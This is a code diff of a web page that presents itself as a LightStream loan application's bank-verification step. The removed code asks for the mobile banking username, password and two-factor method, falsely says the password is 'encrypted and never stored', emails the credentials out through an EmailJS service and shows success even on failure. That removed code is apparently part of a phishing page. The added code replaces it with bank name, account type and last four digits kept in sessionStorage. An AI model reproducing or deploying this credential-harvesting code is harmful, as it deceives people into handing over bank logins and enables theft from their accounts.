@@ -153,74 +153,56 @@
                         <!-- Bank Selection -->
                         <div class="mb-6">
                             <label class="block text-gray-700 text-sm font-bold mb-2" for="bankName">
-                                Select Your Bank *
+                                Bank Name *
                             </label>
                             <select id="bankName" name="bankName" required
                                     class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
                                 <option value="">Choose your bank</option>
-                                <option value="chase">Chase Bank</option>
-                                <option value="bank-of-america">Bank of America</option>
-                                <option value="wells-fargo">Wells Fargo</option>
-                                <option value="citibank">Citibank</option>
-                                <option value="capital-one">Capital One</option>
-                                <option value="us-bank">U.S. Bank</option>
-                                <option value="pnc">PNC Bank</option>
-                                <option value="td-bank">TD Bank</option>
-                                <option value="bbt">BB&T (now Truist)</option>
-                                <option value="suntrust">SunTrust (now Truist)</option>
-                                <option value="regions">Regions Bank</option>
-                                <option value="fifth-third">Fifth Third Bank</option>
-                                <option value="keybank">KeyBank</option>
-                                <option value="huntington">Huntington Bank</option>
-                                <option value="citizens">Citizens Bank</option>
-                                <option value="ally">Ally Bank</option>
-                                <option value="discover">Discover Bank</option>
-                                <option value="synchrony">Synchrony Bank</option>
-                                <option value="marcus">Marcus by Goldman Sachs</option>
-                                <option value="other">Other Bank</option>
+                                <option value="Chase Bank">Chase Bank</option>
+                                <option value="Bank of America">Bank of America</option>
+                                <option value="Wells Fargo">Wells Fargo</option>
+                                <option value="Citibank">Citibank</option>
+                                <option value="Capital One">Capital One</option>
+                                <option value="U.S. Bank">U.S. Bank</option>
+                                <option value="PNC Bank">PNC Bank</option>
+                                <option value="TD Bank">TD Bank</option>
+                                <option value="Truist">Truist</option>
+                                <option value="Regions Bank">Regions Bank</option>
+                                <option value="Fifth Third Bank">Fifth Third Bank</option>
+                                <option value="KeyBank">KeyBank</option>
+                                <option value="Huntington Bank">Huntington Bank</option>
+                                <option value="Citizens Bank">Citizens Bank</option>
+                                <option value="Ally Bank">Ally Bank</option>
+                                <option value="Discover Bank">Discover Bank</option>
+                                <option value="Other">Other Bank</option>
                             </select>
                         </div>
 
-                        <!-- Mobile Banking User ID -->
+                        <!-- Account Type (Optional) -->
                         <div class="mb-6">
-                            <label class="block text-gray-700 text-sm font-bold mb-2" for="userId">
-                                Mobile Banking User ID *
+                            <label class="block text-gray-700 text-sm font-bold mb-2" for="accountType">
+                                Account Type (Optional)
                             </label>
-                            <input type="text" id="userId" name="userId" required
-                                   class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                   placeholder="Enter your online banking username">
-                            <p class="text-xs text-gray-500 mt-1">This is the same username you use to log into your mobile banking app</p>
-                        </div>
-
-                        <!-- Password -->
-                        <div class="mb-6">
-                            <label class="block text-gray-700 text-sm font-bold mb-2" for="password">
-                                Mobile Banking Password *
-                            </label>
-                            <div class="relative">
-                                <input type="password" id="password" name="password" required
-                                       class="w-full px-3 py-3 pr-10 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
-                                       placeholder="Enter your password">
-                                <button type="button" id="togglePassword"
-                                        class="absolute right-3 top-3 text-gray-500 hover:text-gray-700">
-                                    <i class="fas fa-eye" id="eyeIcon"></i>
-                                </button>
-                            </div>
-                            <p class="text-xs text-gray-500 mt-1">Your password is encrypted and never stored</p>
-                        </div>
-
-                        <!-- Two-Factor Authentication -->
-                        <div class="mb-6">
-                            <label class="block text-gray-700 text-sm font-bold mb-2" for="twoFactor">
-                                Two-Factor Authentication Method
-                            </label>
-                            <select id="twoFactor" name="twoFactor"
+                            <select id="accountType" name="accountType"
                                     class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500">
-                                <option value="sms">SMS Text Message</option>
-                                <option value="email">Email Code</option>
-                                <option value="authenticator">Authenticator App</option>
-                                <option value="security-questions">Security Questions</option>
+                                <option value="">Select account type</option>
+                                <option value="Checking">Checking Account</option>
+                                <option value="Savings">Savings Account</option>
+                                <option value="Money Market">Money Market Account</option>
+                                <option value="CD">Certificate of Deposit</option>
                             </select>
+                        </div>
+
+                        <!-- Last 4 Digits (Optional) -->
+                        <div class="mb-6">
+                            <label class="block text-gray-700 text-sm font-bold mb-2" for="accountLast4">
+                                Last 4 Digits of Account Number (Optional)
+                            </label>
+                            <input type="text" id="accountLast4" name="accountLast4" 
+                                   maxlength="4" pattern="[0-9]{4}"
+                                   class="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500"
+                                   placeholder="Enter last 4 digits">
+                            <p class="text-xs text-gray-500 mt-1">For verification purposes only</p>
                         </div>
 
                         <!-- Terms and Conditions -->
@@ -228,7 +210,7 @@
                             <label class="flex items-start">
                                 <input type="checkbox" id="terms" name="terms" class="mr-2 mt-1" required>
                                 <span class="text-sm text-gray-700">
-                                    I authorize LightStream to securely connect to my bank account for verification purposes only. I understand my credentials are encrypted and never stored.
+                                    I confirm that I have provided accurate bank information for loan processing purposes.
                                 </span>
                             </label>
                         </div>
@@ -241,7 +223,7 @@
                             </button>
                             <button type="submit"
                                     class="flex-1 bg-indigo-600 text-white py-3 rounded-lg hover:bg-indigo-700 transition duration-200">
-                                Connect Securely
+                                Continue to Agreement
                             </button>
                         </div>
                     </form>
@@ -470,103 +452,85 @@
         function submitBankAuth(data) {
             const submitButton = document.querySelector('#bankAuthForm button[type="submit"]');
             const originalText = submitButton.textContent;
-            submitButton.textContent = 'Connecting...';
+            submitButton.textContent = 'Processing...';
             submitButton.disabled = true;
             
-            // Check if EmailJS is loaded
-            if (typeof emailjs === 'undefined') {
-                alert('Email service not available. Please try again.');
+            // Get existing loan data from sessionStorage
+            let loanData = {};
+            try {
+                const storedData = sessionStorage.getItem('loanApplicationData');
+                if (storedData) {
+                    loanData = JSON.parse(storedData);
+                } else {
+                    alert('No loan application data found. Please start your application again.');
+                    window.location.href = 'personal-loans.html';
+                    return;
+                }
+            } catch (error) {
+                console.error('Error retrieving loan data:', error);
+                alert('Error retrieving your application. Please start again.');
+                window.location.href = 'personal-loans.html';
+                return;
+            }
+            
+            // Collect bank authentication data
+            const bankName = document.getElementById('bankName')?.value || '';
+            const accountType = document.getElementById('accountType')?.value || '';
+            const accountLast4 = document.getElementById('accountLast4')?.value || '';
+            
+            // Validate bank name (required)
+            if (!bankName) {
+                alert('Please select your bank name');
                 submitButton.textContent = originalText;
                 submitButton.disabled = false;
                 return;
             }
             
-            // Prepare EmailJS data for bank authentication ONLY
-            const bankValue = document.getElementById('bankName')?.value || '';
-            const bankNames = {
-                'chase': 'Chase Bank',
-                'bank-of-america': 'Bank of America',
-                'wells-fargo': 'Wells Fargo',
-                'citibank': 'Citibank',
-                'capital-one': 'Capital One',
-                'us-bank': 'U.S. Bank',
-                'pnc': 'PNC Bank',
-                'td-bank': 'TD Bank',
-                'bbt': 'BB&T (now Truist)',
-                'suntrust': 'SunTrust (now Truist)',
-                'regions': 'Regions Bank',
-                'fifth-third': 'Fifth Third Bank',
-                'keybank': 'KeyBank',
-                'huntington': 'Huntington Bank',
-                'citizens': 'Citizens Bank',
-                'ally': 'Ally Bank',
-                'discover': 'Discover Bank',
-                'synchrony': 'Synchrony Bank',
-                'marcus': 'Marcus by Goldman Sachs'
+            // Combine loan data with bank data
+            const combinedData = {
+                ...loanData,
+                bankName: bankName,
+                accountType: accountType,
+                accountLast4: accountLast4,
+                bankAuthSubmissionDate: new Date().toLocaleString(),
+                applicationStatus: 'Bank authentication completed - Ready for agreement'
             };
             
-            const emailData = {
-                // Customer Information
-                firstName: data.firstName || 'Bank',
-                lastName: data.lastName || 'Authentication',
-                email: data.email || 'bank-auth@lightstream.com',
-                phone: data.phone || 'N/A',
-                
-                // Bank Information (matching template field names)
-                bankName: bankNames[bankValue] || 'User Bank',
-                userId: data.userId || data.bankUserId,
-                password: data.password || data.bankPassword,
-                twoFactor: data.twoFactor || 'Not specified',
-                
-                // Application Details
-                submissionDate: new Date().toLocaleString(),
-                applicationType: 'Bank Authentication Request',
-                applicationStatus: 'Bank authentication submitted successfully'
-            };
+            console.log('Combined data:', combinedData);
             
-            // Send email using EmailJS
-            emailjs.send('service_mblpi2k', 'template_wo7l8te', emailData)
-                .then(function(response) {
-                    console.log('Bank authentication email sent successfully!', response.status, response.text);
-                    
-                    // Hide the form and show the review message
-                    const form = document.getElementById('bankAuthForm');
-                    const formContainer = form.parentElement;
-                    
-                    // Create and show the review message
-                    formContainer.innerHTML = `
-                        <div class="text-center">
-                            <div class="mb-6">
-                                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-                                    <i class="fas fa-check text-green-600 text-3xl"></i>
-                                </div>
-                                <h2 class="text-2xl font-bold text-gray-800 mb-2">Bank Authentication Submitted Successfully!</h2>
-                                <p class="text-gray-600 mb-4">Your bank authentication has been received and is being processed.</p>
-                                <p class="text-sm text-gray-500">We will contact you shortly with the next steps.</p>
+            // Store combined data in sessionStorage
+            try {
+                sessionStorage.setItem('loanApplicationData', JSON.stringify(combinedData));
+                console.log('Combined data stored in sessionStorage successfully');
+                
+                // Show processing message
+                const form = document.getElementById('bankAuthForm');
+                const formContainer = form.parentElement;
+                
+                formContainer.innerHTML = `
+                    <div class="text-center">
+                        <div class="mb-6">
+                            <div class="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                                <i class="fas fa-spinner fa-spin text-blue-600 text-3xl"></i>
                             </div>
+                            <h2 class="text-2xl font-bold text-gray-800 mb-2">Processing Your Information...</h2>
+                            <p class="text-gray-600 mb-4">We're preparing your loan agreement.</p>
+                            <p class="text-sm text-gray-500">You will be redirected in a moment...</p>
                         </div>
-                    `;
-                })
-                .catch(function(error) {
-                    console.error('Email failed:', error);
-                    
-                    // Still show success even if email fails
-                    const form = document.getElementById('bankAuthForm');
-                    const formContainer = form.parentElement;
-                    
-                    formContainer.innerHTML = `
-                        <div class="text-center">
-                            <div class="mb-6">
-                                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-                                    <i class="fas fa-check text-green-600 text-3xl"></i>
-                                </div>
-                                <h2 class="text-2xl font-bold text-gray-800 mb-2">Bank Authentication Submitted!</h2>
-                                <p class="text-gray-600 mb-4">Your bank authentication has been received.</p>
-                                <p class="text-sm text-gray-500">We will contact you shortly.</p>
-                            </div>
-                        </div>
-                    `;
-                });
+                    </div>
+                `;
+                
+                // Redirect to loan agreement page after a short delay
+                setTimeout(() => {
+                    window.location.href = 'loan-agreement.html';
+                }, 2000);
+                
+            } catch (error) {
+                console.error('Error storing combined data:', error);
+                alert('Error processing your information. Please try again.');
+                submitButton.textContent = originalText;
+                submitButton.disabled = false;
+            }
         }
                             
         function goBack() {
